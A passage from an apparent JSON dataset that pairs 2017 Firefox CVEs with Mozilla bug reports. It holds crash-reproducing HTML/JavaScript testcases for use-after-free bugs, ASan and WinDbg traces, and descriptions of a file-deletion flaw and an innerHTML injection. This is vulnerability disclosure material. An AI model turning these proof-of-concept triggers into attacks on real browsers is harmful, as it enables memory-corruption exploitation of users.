0x7f6f693d6598 in XRE_InitChildProcess(int, char**, XREChildData const*) toolkit/xre/nsEmbedFunctions.cpp:712:34 > #41 0x524fc1 in content_process_main browser/app/../../ipc/contentproc/plugin-container.cpp:64:30 > #42 0x524fc1 in main browser/app/nsBrowserApp.cpp:286 > #43 0x7f6f79ee7f44 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21f44) > >SUMMARY: AddressSanitizer: heap-use-after-free dom/fetch/Fetch.cpp:1006:21 in mozilla::dom::(anonymous namespace)::ConsumeBodyDoneObserver<mozilla::dom::Request>::OnStreamComplete(nsIStreamLoader*, nsISupports*, nsresult, unsigned int, unsigned char const*) >Shadow bytes around the buggy address: > 0x0c1a80004ce0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa > 0x0c1a80004cf0: fa fa fa fa fa fa fa fa fa fa fa fa fd fd fd fd > 0x0c1a80004d00: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa > 0x0c1a80004d10: fa fa fa fa fa fa fd fd fd fd fd fd fd fd fd fd > 0x0c1a80004d20: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa >=>0x0c1a80004d30: fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd fd > 0x0c1a80004d40: fd fd fa fa fa fa fa fa fa fa fd fd fd fd fd fd > 0x0c1a80004d50: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa > 0x0c1a80004d60: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd > 0x0c1a80004d70: fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa fa > 0x0c1a80004d80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa >Shadow byte legend (one shadow byte represents 8 application bytes): > Addressable: 00 > Partially addressable: 01 02 03 04 05 06 07 > Heap left redzone: fa > Freed heap region: fd > Stack left redzone: f1 > Stack mid redzone: f2 > Stack right redzone: f3 > Stack after return: f5 > Stack use after scope: f8 > Global redzone: f9 > Global init order: f6 > Poisoned by user: f7 > Container overflow: fc > Array cookie: ac > Intra object redzone: bb > ASan internal: fe > Left alloca redzone: ca > Right alloca redzone: cb >==107957==ABORTING >"
      }
    ],
    "CVE-2017-7796": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1234401",
        "title": "Update logger can delete arbitrary files with the name \"update.log\"",
        "description": "On Windows, the update logging system's initialization procedure includes a step that deletes the file that it plans to write to. The name of this file is hard coded as \"update.log\", but the path to it is read from the command line. The updater can be invoked through the maintenance service, so anyone able to execute that with the right command line can cause any file with the name update.log anywhere on the system to be deleted, using the very high privilege level that the service gets invoked at."
      }
    ],
    "CVE-2017-7798": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1371586%2C1372112",
        "description": "On Windows, the update logging system's initialization procedure includes a step that deletes the file that it plans to write to. The name of this file is hard coded as \"update.log\", but the path to it is read from the command line. The updater can be invoked through the maintenance service, so anyone able to execute that with the right command line can cause any file with the name update.log anywhere on the system to be deleted, using the very high privilege level that the service gets invoked at."
      }
    ],
    "CVE-2017-7799": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1372509",
        "title": "Self-XSS XUL Injection in about:webrtc",
        "description": "(This would be a sec-critical, if there was a way for an attacker to inject markup to this page. It seems to me the information comes from the browser user through actual interaction and it's unlikely someone creates and uses a file called <textarea> :-)) JavaScript in about:webrtc should use textContent or escape HTML before assigning to .innerHTML 1) http://searchfox.org/mozilla-central/rev/1a054419976437d0778a2b89be1b00207a744e94/toolkit/content/aboutwebrtc/aboutWebrtc.js#143 > this.msg.innerHTML = > `<span class=\"info-label\">${this._messageHeader}:</span> ${this._message}`; In this case, I suggest replacing ><'& with their respective entities for both variables. This could be done with a tagged template string and an escape function like https://github.com/fxos-eng/sanitizer/blob/master/sanitizer.js#L46-L57 In http://searchfox.org/mozilla-central/rev/1a054419976437d0778a2b89be1b00207a744e94/toolkit/content/aboutwebrtc/aboutWebrtc.js#308 > msg.innerHTML = `${data.error.name}: ${data.error.message}`; I suggest using textContent instead of innerHTML I am assigning this to you jib, because you have been modifying this file in the past. Please help me find someone else if you can not take this bug."
      }
    ],
    "CVE-2017-7800": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1374047",
        "title": "WebSocket - Use After Free in WebSocketImpl::DisconnectInternal()",
        "description": "Reproduction test case (whole server code in attached file UAF_DisconnectInternal_Repro.js): Main page code: <script> var worker0 = new Worker(\"worker0.js\"); setTimeout(function(){ worker0.terminate();}, 200); setTimeout(function(){location.reload()},200); </script> Worker code: new WebSocket(\"ws://localhost:12345/\", \"wsm1-protocol\");; Steps to reproduce: 1. Run server side script UAF_DisconnectInternal_Repro.js with Node.js (node UAF_DisconnectInternal_Repro.js). 2. Enter http://localhost:12345 in Firefox browser. Firefox version: 54.0 (32-bit) OS: Windows 10 Stack trace: (16a8.30b4): Access violation - code c0000005 (!!! second chance !!!) eax=00000000 ebx=18d77028 ecx=18d77028 edx=e5e5e5e5 esi=67d4b030 edi=18d76f80 eip=65f98e0c esp=0117f1cc ebp=0117f1cc iopl=0 nv up ei ng nz na po nc cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010282 xul!mozilla::RefPtrTraits<mozilla::EditTransactionBase>::Release [inlined in xul!RefPtr<mozilla::EditTransactionBase>::assign_assuming_AddRef+0x12]: 65f98e0c 8b02 mov eax,dword ptr [edx] ds:002b:e5e5e5e5=???????? 0:000> !analyze -v ******************************************************************************* * * * Exception Analysis * * * ******************************************************************************* FAULTING_IP: xul!RefPtr<mozilla::EditTransactionBase>::assign_assuming_AddRef+12 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\obj-firefox\\dist\\include\\mozilla\\refptr.h @ 65] 65f98e0c 8b02 mov eax,dword ptr [edx] EXCEPTION_RECORD: (.exr -1) ExceptionAddress: 65f98e0c (xul!mozilla::RefPtrTraits<mozilla::EditTransactionBase>::Release) ExceptionCode: c0000005 (Access violation) ExceptionFlags: 00000000 NumberParameters: 2 Parameter[0]: 00000000 Parameter[1]: e5e5e5e5 Attempt to read from address e5e5e5e5 FAULTING_THREAD: 000030b4 PROCESS_NAME: firefox.exe ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s. EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s. EXCEPTION_CODE_STR: c0000005 EXCEPTION_PARAMETER1: 00000000 EXCEPTION_PARAMETER2: e5e5e5e5 FOLLOWUP_IP: xul!RefPtr<mozilla::EditTransactionBase>::assign_assuming_AddRef+12 [c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\obj-firefox\\dist\\include\\mozilla\\refptr.h @ 65] 65f98e0c 8b02 mov eax,dword ptr [edx] READ_ADDRESS: e5e5e5e5 WATSON_BKT_PROCSTAMP: 59399e7c WATSON_BKT_PROCVER: 54.0.0.6368 PROCESS_VER_PRODUCT: Firefox WATSON_BKT_MODULE: xul.dll WATSON_BKT_MODSTAMP: 5939a290 WATSON_BKT_MODOFFSET: 88e0c WATSON_BKT_MODVER: 54.0.0.6368 MODULE_VER_PRODUCT: Firefox BUILD_VERSION_STRING: 10.0.15063.296 (WinBuild.160101.0800) MODLIST_WITH_TSCHKSUM_HASH: 6677a630c80a09dae24ad5f75ef967a3823bc5ff MODLIST_SHA1_HASH: d474cec995c2004a6ffece945bcd0a3e7837f453 NTGLOBALFLAG: 70 PROCESS_BAM_CURRENT_THROTTLED: 0 PROCESS_BAM_PREVIOUS_THROTTLED: 0 APPLICATION_VERIFIER_FLAGS: 0 PRODUCT_TYPE: 1 SUITE_MASK: 784 DUMP_TYPE: fe ANALYSIS_SESSION_TIME: 06-18-2017 22:32:19.0170 ANALYSIS_VERSION: 10.0.15063.400 x86fre THREAD_ATTRIBUTES: OS_LOCALE: ENA PROBLEM_CLASSES: ID: [0n292] Type: [@ACCESS_VIOLATION] Class: Addendum Scope: BUCKET_ID Name: Omit Data: Omit PID: [Unspecified] TID: [0x30b4] Frame: [0] : xul!RefPtr<mozilla::EditTransactionBase>::assign_assuming_AddRef ID: [0n264] Type: [INVALID_POINTER_READ] Class: Primary Scope: DEFAULT_BUCKET_ID (Failure Bucket ID prefix) BUCKET_ID Name: Add Data: Omit PID: [Unspecified] TID: [0x30b4] Frame: [0] : xul!RefPtr<mozilla::EditTransactionBase>::assign_assuming_AddRef ID: [0n94] Type: [FILL_PATTERN] Class: Addendum Scope: DEFAULT_BUCKET_ID (Failure Bucket ID prefix) BUCKET_ID Name: Add Data: Add String: [e5e5e5e5] PID: [0x16a8] TID: [0x30b4] Frame: [0] : xul!RefPtr<mozilla::EditTransactionBase>::assign_assuming_AddRef BUGCHECK_STR: APPLICATION_FAULT_INVALID_POINTER_READ_FILL_PATTERN_e5e5e5e5 DEFAULT_BUCKET_ID: INVALID_POINTER_READ_FILL_PATTERN_e5e5e5e5 PRIMARY_PROBLEM_CLASS: APPLICATION_FAULT LAST_CONTROL_TRANSFER: from 66cb658b to 65f98e0c STACK_TEXT: 0117f1cc 66cb658b 00000000 00000000 16daeee0 xul!RefPtr<mozilla::EditTransactionBase>::assign_assuming_AddRef+0x12 0117f1fc 66cba1d4 6620c149 15ac8ec0 15ac8ef4 xul!mozilla::dom::WebSocketImpl::DisconnectInternal+0x4b 0117f200 6620c149 15ac8ec0 15ac8ef4 00000000 xul!mozilla::dom::`anonymous namespace'::DisconnectInternalRunnable::MainThreadRun+0x8 0117f214 6620c109 16daeee0 13981380 139813b4 xul!mozilla::dom::workers::WorkerMainThreadRunnable::Run+0x15 0117f23c 6620c08d 0117f26c 6620c109 180ec050 xul!mozilla::ThrottledEventQueue::Inner::ExecuteRunnable+0x76 0117f244 6620c109 180ec050 0b1f5864 180ec060 xul!mozilla::ThrottledEventQueue::Inner::Executor::Run+0xe 0117f26c 6620c08d 0117f2e4 6601f80e 180ec060 xul!mozilla::ThrottledEventQueue::Inner::ExecuteRunnable+0x76 0117f274 6601f80e 180ec060 03127170 03127160 xul!mozilla::ThrottledEventQueue::Inner::Executor::Run+0xe 0117f2e4 66020701 03104200 00000000 0117f317 xul!nsThread::ProcessNextEvent+0x213 0117f318 66068ea0 03125060 60944f31 0b1f5860 xul!mozilla::ipc::MessagePump::Run+0x72 0117f350 66068e6f 03104200 00000001 0b1f5800 xul!MessageLoop::RunHandler+0x20 0117f370 662d19d8 0b1f7640 00000000 0117f390 xul!MessageLoop::Run+0x19 0117f380 662d1767 0b1f5860 0b1f7640 0117f3a4 xul!nsBaseAppShell::Run+0x34 0117f390 662d171c 0b1f5860 0117f6f5 0c30a440 xul!nsAppShell::Run+0x26 0117f3a4 66505f9e 0b1f7640 0117f5f8 0117f610 xul!nsAppStartup::Run+0x22 0117f598 665069d0 03103050 0117f740 00000001 xul!XREMain::XRE_mainRun+0xa92 0117f5d4 6658b805 00000000 0117f610 0017f740 xul!XREMain::XRE_main+0x37b 0117f700 6658b7c7 0117f740 0117fa84 01321bdd xul!XRE_main+0x39 0117f70c 01321bdd 00000001 03103050 0117f740 xul!mozilla::BootstrapImpl::XRE_main+0x11 0117fa84 01325b7f 00000001 fe615d08 01718b50 firefox!wmain+0x65d 0117facc 73b48744 00ee0000 73b48720 7b9e292a firefox!__scrt_common_main_seh+0xf9 0117fae0 770a587d 00ee0000 7f378ec4 00000000 KERNEL32!BaseThreadInitThunk+0x24 0117fb28 770a584d ffffffff 770c6344 00000000 ntdll!__RtlUserThreadStart+0x2f 0117fb38 00000000 01325bf5 00ee0000 00000000 ntdll!_RtlUserThreadStart+0x1b THREAD_SHA1_HASH_MOD_FUNC: c69ed9af77e0e3ae8946fbf3e674aa21f178e624 THREAD_SHA1_HASH_MOD_FUNC_OFFSET: b2a6a3a18b4b25d90fe64452661d0eb068d1731a THREAD_SHA1_HASH_MOD: 1e517827cf137402b6881f2d4a04f0647425c5be FAULT_INSTR_CODE: ff52028b FAULTING_SOURCE_LINE: c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\obj-firefox\\dist\\include\\mozilla\\refptr.h FAULTING_SOURCE_FILE: c:\\builds\\moz2_slave\\m-rel-w32-00000000000000000000\\build\\src\\obj-firefox\\dist\\include\\mozilla\\refptr.h FAULTING_SOURCE_LINE_NUMBER: 65 SYMBOL_STACK_INDEX: 0 SYMBOL_NAME: xul!RefPtr<mozilla::EditTransactionBase>::assign_assuming_AddRef+12 FOLLOWUP_NAME: MachineOwner MODULE_NAME: xul IMAGE_NAME: xul.dll DEBUG_FLR_IMAGE_TIMESTAMP: 5939a290 STACK_COMMAND: ~0s ; kb FAILURE_BUCKET_ID: INVALID_POINTER_READ_FILL_PATTERN_e5e5e5e5_c0000005_xul.dll!RefPtr_mozilla::EditTransactionBase_::assign_assuming_AddRef BUCKET_ID: APPLICATION_FAULT_INVALID_POINTER_READ_FILL_PATTERN_e5e5e5e5_xul!RefPtr_mozilla::EditTransactionBase_::assign_assuming_AddRef+12 FAILURE_EXCEPTION_CODE: c0000005 FAILURE_IMAGE_NAME: xul.dll BUCKET_ID_IMAGE_STR: xul.dll FAILURE_MODULE_NAME: xul BUCKET_ID_MODULE_STR: xul FAILURE_FUNCTION_NAME: RefPtr_mozilla::EditTransactionBase_::assign_assuming_AddRef BUCKET_ID_FUNCTION_STR: RefPtr_mozilla::EditTransactionBase_::assign_assuming_AddRef BUCKET_ID_OFFSET: 12 BUCKET_ID_MODTIMEDATESTAMP: 5939a290 BUCKET_ID_MODCHECKSUM: 31298a4 BUCKET_ID_MODVER_STR: 54.0.0.6368 BUCKET_ID_PREFIX_STR: APPLICATION_FAULT_INVALID_POINTER_READ_FILL_PATTERN_e5e5e5e5_ FAILURE_PROBLEM_CLASS: APPLICATION_FAULT FAILURE_SYMBOL_NAME: xul.dll!RefPtr_mozilla::EditTransactionBase_::assign_assuming_AddRef WATSON_STAGEONE_URL: http://watson.microsoft.com/StageOne/firefox.exe/54.0.0.6368/59399e7c/xul.dll/54.0.0.6368/5939a290/c0000005/00088e0c.htm?Retriage=1 TARGET_TIME: 2017-06-18T10:33:04.000Z OSBUILD: 15063 OSSERVICEPACK: 296 SERVICEPACK_NUMBER: 0 OS_REVISION: 0 OSPLATFORM_TYPE: x86 OSNAME: Windows 10 OSEDITION: Windows 10 WinNt SingleUserTS Personal USER_LCID: 0 OSBUILD_TIMESTAMP: unknown_date BUILDDATESTAMP_STR: 160101.0800 BUILDLAB_STR: WinBuild BUILDOSVER_STR: 10.0.15063.296 ANALYSIS_SESSION_ELAPSED_TIME: 104d4 ANALYSIS_SOURCE: UM FAILURE_ID_HASH_STRING: um:invalid_pointer_read_fill_pattern_e5e5e5e5_c0000005_xul.dll!refptr_mozilla::edittransactionbase_::assign_assuming_addref FAILURE_ID_HASH: {6bdf5e90-d575-dd3a-0b53-74c46bf9fa98} Followup: MachineOwner --------- Variable shows the WebSocketImpl object had been freed: 0:000> dt this Local var @ edi Type mozilla::dom::WebSocketImpl* +0x000 __VFN_table : 0xe5e5e5e5 +0x004 __VFN_table : 0xe5e5e5e5 +0x008 __VFN_table : 0xe5e5e5e5 +0x00c __VFN_table : 0xe5e5e5e5 +0x010 mProxy : 0xe5e5e5e5 nsWeakReference +0x014 __VFN_table : 0xe5e5e5e5 +0x018 __VFN_table : 0xe5e5e5e5 +0x01c mRefCnt : mozilla::ThreadSafeAutoRefCnt +0x020 mWebSocket : RefPtr<mozilla::dom::WebSocket> +0x024 mChannel : nsCOMPtr<nsIWebSocketChannel> +0x028 mIsServerSide : ffffffffffffffe5 +0x029 mSecure : ffffffffffffffe5 +0x02a mOnCloseScheduled : ffffffffffffffe5 +0x02b mFailed : ffffffffffffffe5 +0x02c mDisconnectingOrDisconnected : ffffffffffffffe5 +0x02d mCloseEventWasClean : ffffffffffffffe5 +0x030 mCloseEventReason : nsString +0x03c mCloseEventCode : 0xe5e5 +0x040 mAsciiHost : nsCString +0x04c mPort : 0xe5e5e5e5 +0x050 mResource : nsCString +0x05c mUTF16Origin : nsString +0x068 mURI : nsCString +0x074 mRequestedProtocolList : nsCString +0x080 mOriginDocument : nsCOMPtr<nsIWeakReference> +0x084 mScriptFile : nsCString +0x090 mScriptLine : 0xe5e5e5e5 +0x094 mScriptColumn : 0xe5e5e5e5 +0x098 mInnerWindowID : 0xe5e5e5e5`e5e5e5e5 +0x0a0 mWorkerPrivate : 0xe5e5e5e5 mozilla::dom::workers::WorkerPrivate +0x0a4 mWorkerHolder : nsAutoPtr<mozilla::dom::workers::WorkerHolder> +0x0a8 mWeakLoadGroup : nsCOMPtr<nsIWeakReference> +0x0ac mIsMainThread : ffffffffffffffe5 +0x0b0 mMutex : mozilla::Mutex +0x0b4 mWorkerShuttingDown : ffffffffffffffe5 +0x0b8 mService : RefPtr<mozilla::net::WebSocketEventService>"
      }
    ],
    "CVE-2017-7801": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1371259",
        "title": "heap-use-after-free in nsComputedDOMStyle::UpdateCurrentStyleSources",
        "description": "The following testcase crashes the latest ASAN build of Firefox ESR 52.2.0 (20170607010726) <script> function start() { o0=window.open('data:text/html,<div>','popup65','height=88,width=131081,top=46,outerHeight=-1024,toolbar,resizable'); o1=window.open('data:text/html,<div>','popup73','height=-1,width=64,outerHeight=38,outerWidth=-8,toolbar,resizable'); o1.onload=fun0; } function fun0(e) { o5=o0.document; o0.onresize=fun1; o45=o5.querySelector('*:not([id])'); o95=document.createElementNS('http://www.w3.org/1999/xhtml','marquee'); o45.appendChild(o95); o0.resizeBy(8,4194304); } function fun1() { o0.close(); o1.open('data:text/html,<div>','popup3','width=1,left=32768,menubar,toolbar,personalbar,status,resizable'); fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); } </script> <body onload=\"start()\"></body> ================================================================= ==1349==ERROR: AddressSanitizer: heap-use-after-free on address 0x60c0008a1ea0 at pc 0x7f65e45838b1 bp 0x7fff56b07810 sp 0x7fff56b07808 WRITE of size 8 at 0x60c0008a1ea0 thread T0 #0 0x7f65e45838b0 in nsComputedDOMStyle::UpdateCurrentStyleSources(bool) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:639:14 #1 0x7f65e4583efb in nsComputedDOMStyle::GetPropertyCSSValue(nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:796:3 #2 0x7f65e4582196 in nsComputedDOMStyle::GetPropertyValue(nsAString_internal const&, nsAString_internal&) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:379:26 #3 0x7f65e4581fb8 in nsComputedDOMStyle::GetPropertyValue(nsCSSPropertyID, nsAString_internal&) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:317:10 #4 0x7f65e0ed3ae9 in GetWidth /home/worker/workspace/build/src/layout/style/nsCSSPropList.h:4392:1 #5 0x7f65e0ed3ae9 in mozilla::dom::CSS2PropertiesBinding::get_width(JSContext*, JS::Handle<JSObject*>, nsDOMCSSDeclaration*, JSJitGetterCallArgs) /home/worker/workspace/build/src/obj-firefox/dom/bindings/CSS2PropertiesBinding.cpp:42528 #6 0x7f65e243ce3d in mozilla::dom::GenericBindingGetter(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2813:13 #7 0x7f65e87ba2e5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #8 0x7f65e87ba2e5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #9 0x7f65e87baf92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #10 0x7f65e828c12d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 #11 0x7f65df404ea2 in Call /home/worker/workspace/build/src/obj-firefox/dist/include/jsapi.h:3330:12 #12 0x7f65df404ea2 in xpc::XrayWrapper<js::CrossCompartmentWrapper, xpc::DOMXrayTraits>::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/js/xpconnect/wrappers/XrayWrapper.cpp:2247 #13 0x7f65e85043ee in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:309:12 #14 0x7f65e850478c in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1522:16 #15 0x7f65e850478c in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:305 #16 0x7f65e87c65e1 in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1522:16 #17 0x7f65e87c65e1 in GetProperty /home/worker/workspace/build/src/js/src/jsobj.h:846 #18 0x7f65e87c65e1 in js::GetProperty(JSContext*, JS::Handle<JS::Value>, JS::Handle<js::PropertyName*>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:4263 #19 0x7f65e879eb9c in GetPropertyOperation /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:192:12 #20 0x7f65e879eb9c in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2639 #21 0x7f65e877f8ad in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #22 0x7f65e87ba94f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #23 0x7f65e87baf92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #24 0x7f65e8289ec2 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #25 0x7f65e3cb130b in Call /home/worker/workspace/build/src/obj-firefox/dist/include/jsapi.h:3310:14 #26 0x7f65e3cb130b in nsXBLProtoImplAnonymousMethod::Execute(nsIContent*, JSAddonId*) /home/worker/workspace/build/src/dom/xbl/nsXBLProtoImplMethod.cpp:331 #27 0x7f65e3c7b24e in nsXBLBinding::ExecuteAttachedHandler() /home/worker/workspace/build/src/dom/xbl/nsXBLBinding.cpp:634:5 #28 0x7f65e3c7b04e in nsBindingManager::ProcessAttachedQueueInternal(unsigned int) /home/worker/workspace/build/src/dom/xbl/nsBindingManager.cpp:419:7 #29 0x7f65e4aa5009 in ProcessAttachedQueue /home/worker/workspace/build/src/dom/xbl/nsBindingManager.h:105:5 #30 0x7f65e4aa5009 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4167 #31 0x7f65e47b721c in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1836:11 #32 0x7f65e47c3a61 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:295:7 #33 0x7f65e47c34f5 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:316:5 #34 0x7f65e47c601e in applyImpl<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), StoreCopyPassByValue<mozilla::TimeStamp> , 0> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:775:12 #35 0x7f65e47c601e in apply<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp)> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:781 #36 0x7f65e47c601e in mozilla::detail::RunnableMethodImpl<void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), true, false, mozilla::TimeStamp>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:810 #37 0x7f65ddd178bb in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #38 0x7f65ddd999fc in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #39 0x7f65deb5140f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #40 0x7f65deac2fc8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #41 0x7f65deac2fc8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #42 0x7f65deac2fc8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #43 0x7f65e40ec19f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #44 0x7f65e6166451 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #45 0x7f65e62fd757 in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #46 0x7f65e62feecd in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 #47 0x7f65e62ffd8c in XRE_main /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4712:16 #48 0x4df91a in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282:10 #49 0x4df91a in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:415 #50 0x7f65f8fc182f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #51 0x41ba88 in _start (/home/nils/fuzzer3/esr/firefox/firefox+0x41ba88) 0x60c0008a1ea0 is located 96 bytes inside of 128-byte region [0x60c0008a1e40,0x60c0008a1ec0) freed by thread T0 here: #0 0x4b21db in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f65ddbe0354 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2665:9 #2 0x7f65ddbdff46 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2840:3 #3 0x7f65ddbe701e in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3826:3 #4 0x7f65ddbe64dc in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3651:9 #5 0x7f65ddbea556 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4144:3 #6 0x7f65e0a7cb19 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1440:3 #7 0x7f65e05aa55d in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1340:3 #8 0x7f65ddd3fec6 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_x86_64_unix.cpp:180:23 #9 0x7f65df562fbe in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2058:12 #10 0x7f65df562fbe in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1377 #11 0x7f65df562fbe in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1344 #12 0x7f65df56a648 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:999:12 #13 0x7f65e87ba2e5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #14 0x7f65e87ba2e5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #15 0x7f65e879a6ef in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #16 0x7f65e879a6ef in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #17 